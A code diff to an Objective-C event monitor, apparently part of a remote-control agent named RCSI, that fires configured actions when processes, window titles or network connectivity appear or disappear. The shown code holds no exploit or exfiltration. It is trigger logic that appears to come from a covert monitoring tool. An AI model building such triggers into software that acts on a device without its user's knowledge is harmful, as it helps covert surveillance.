@@ -20,6 +20,8 @@
 #import "RCSITaskManager.h"
 #import "RCSISharedMemory.h"
 
+#import "Reachability.h"
+
 //#define DEBUG
 
 #pragma mark -
@@ -44,6 +46,7 @@ typedef struct _process {
 } processStruct;
 
 typedef struct _connection {
+  u_int onClose;
   u_long typeOfConnection; // 1 for Wifi - 2 for GPRS - 3 for WiFI || GPRS
 } connectionStruct;
 
@@ -76,8 +79,7 @@ typedef struct _batteryLevel {
 
 extern RCSISharedMemory *mSharedMemoryCommand;
 static RCSIEvents *sharedEvents = nil;
-static BOOL wifiFound = FALSE;
-static BOOL gprsFound = FALSE;
+static BOOL gConnectionFound = FALSE;
 
 NSLock *connectionLock;
 
@@ -370,7 +372,7 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG
+#ifdef DEBUG_VERBOSE
       NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
@@ -418,7 +420,7 @@ NSLock *connectionLock;
         {
         case PROCESS:
           {
-#ifdef DEBUG
+#ifdef DEBUG_VERBOSE
             NSLog(@"Looking for Process %@", process);
 #endif
             if (processAlreadyFound != 0 && findProcessWithName(process) == NO)
@@ -445,48 +447,7 @@ NSLock *connectionLock;
           }
         case WIN_TITLE:
           {
-#if 0
-            titleFound = NO;
-            //NSLog(@"Looking for Window Title");
-            CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
-                                                               kCGNullWindowID);
-            
-            for (NSMutableDictionary *entry in (NSArray *)windowList)
-              {
-                NSString *windowName = [entry objectForKey: (id)kCGWindowName];
-                
-                if (matchPattern([[windowName lowercaseString] UTF8String],
-                                 [[process lowercaseString] UTF8String]))
-                //if (windowName != NULL && [windowName isCaseInsensitiveLike: process])
-                  {
-                    titleFound = YES;
-                  }
-              }
-            
-            CFRelease(windowList);
-            
-            if (processAlreadyFound != 0 && titleFound == NO)
-              {
-                processAlreadyFound = 0;
-                
-                if (onTermination != -1)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Window Title (%@) found (onTermination), action %d", process,
-                          onTermination);
-#endif
-                    [taskManager triggerAction: onTermination];
-                  }
-              }
-            else if (processAlreadyFound == 0 && titleFound == YES)
-              {
-                processAlreadyFound = 1;
-#ifdef DEBUG
-                NSLog(@"Window Title (%@) found, action %d", process, actionID);
-#endif
-                [taskManager triggerAction: actionID];
-              }
-#endif
+            // TODO
             break;
           }
         default:
@@ -501,7 +462,7 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG
+#ifdef DEBUG_VERBOSE
       NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
@@ -518,101 +479,59 @@ NSLock *connectionLock;
   
   [configuration retain];
   connectionStruct *connectionRawData;
+  connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
 
-  // Create zero addy
-  struct sockaddr_in zeroAddress;
-  bzero(&zeroAddress, sizeof(zeroAddress));
-  zeroAddress.sin_len = sizeof(zeroAddress);
-  zeroAddress.sin_family = AF_INET;
-  
-  int actionID = [[configuration objectForKey: @"actionID"] intValue];
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int onTermination = connectionRawData->onClose;
   
   while ([configuration objectForKey: @"status"] != EVENT_STOP &&
          [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
-      u_int typeOfConnection = connectionRawData->typeOfConnection;
-      
-      // Recover reachability flags
-      SCNetworkReachabilityRef defaultRouteReachability = SCNetworkReachabilityCreateWithAddress(NULL, (struct sockaddr *)&zeroAddress);
-      SCNetworkReachabilityFlags flags;
-      
-      BOOL didRetrieveFlags = SCNetworkReachabilityGetFlags(defaultRouteReachability, &flags);
-      CFRelease(defaultRouteReachability);
-      
-      if (didRetrieveFlags)
+      Reachability *reachability   = [Reachability reachabilityForInternetConnection];
+      NetworkStatus internetStatus = [reachability currentReachabilityStatus];
+  
+      if (internetStatus != NotReachable)
         {
-          BOOL isReachable = flags & kSCNetworkFlagsReachable;
-          BOOL needsConnection = flags & kSCNetworkFlagsConnectionRequired;
-          BOOL nonWiFi = flags & kSCNetworkReachabilityFlagsTransientConnection;
-#ifdef TEST
-          BOOL onDemand = flags & kSCNetworkReachabilityFlagsConnectionOnDemand;
-          BOOL onTraffic = flags & kSCNetworkReachabilityFlagsConnectionOnTraffic;
-#endif
-          
-          switch (typeOfConnection)
+          if (gConnectionFound == FALSE)
             {
-            case CONNECTION_WIFI:
-              {
-                if (isReachable && !needsConnection && !nonWiFi)
-                  {
-                    if (wifiFound == FALSE)
-                      {
-                        wifiFound = TRUE;
-                        [taskManager triggerAction: actionID];
-                      }
-                  }
-                else if (needsConnection)
-                  {
-                    if (wifiFound == TRUE)
-                      wifiFound = FALSE;
-                  }
-                break;
-              }
-            case CONNECTION_GPRS:
-              {
-                if (isReachable && !needsConnection && nonWiFi)
-                  {
-                    if (gprsFound == FALSE)
-                      {
-                        gprsFound = TRUE;
-                        //[taskManager triggerAction: actionID];
-                      }
-                  }
-                else if (needsConnection)
-                  {
-                    if (gprsFound == TRUE)
-                      gprsFound == FALSE;
-                  }
-                break;
-              }
-            default:
-              break;
-            }
-#ifdef TEST
-          NSLog(@"---------------------");
-          NSLog(@"isReachable: %@", (isReachable ? @"YES" : @"NO"));
-          NSLog(@"needsConnection: %@", (needsConnection ? @"YES" : @"NO"));
-          NSLog(@"nonWifi: %@", (nonWiFi ? @"YES" : @"NO"));
-          NSLog(@"onDemand: %@", (onDemand ? @"YES" : @"NO"));
-          NSLog(@"onTraffic: %@", (onTraffic ? @"YES" : @"NO"));
-          NSLog(@"---------------------");
+#ifdef DEBUG
+              NSLog(@"Connection Found, triggering action %d", actionID);
 #endif
+              gConnectionFound = TRUE;
+              [taskManager triggerAction: actionID];
+            }
         }
-      
+      else
+        {
+          if (gConnectionFound == TRUE)
+            {
+#ifdef DEBUG
+              NSLog(@"Connection not found");
+#endif
+              gConnectionFound = FALSE;
+              if (onTermination != -1)
+                {
+#ifdef DEBUG
+                  NSLog(@"Triggering end action %d", onTermination);
+#endif
+                  [taskManager triggerAction: onTermination];
+                }
+            }
+        }
+
       usleep(500000);
       [innerPool release];
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG
+#ifdef DEBUG_VERBOSE
       NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
-      [configuration setValue: EVENT_STOPPED forKey: @"status"];
-      
+      [configuration setValue: EVENT_STOPPED
+                       forKey: @"status"];
       [configuration release];
     }
   
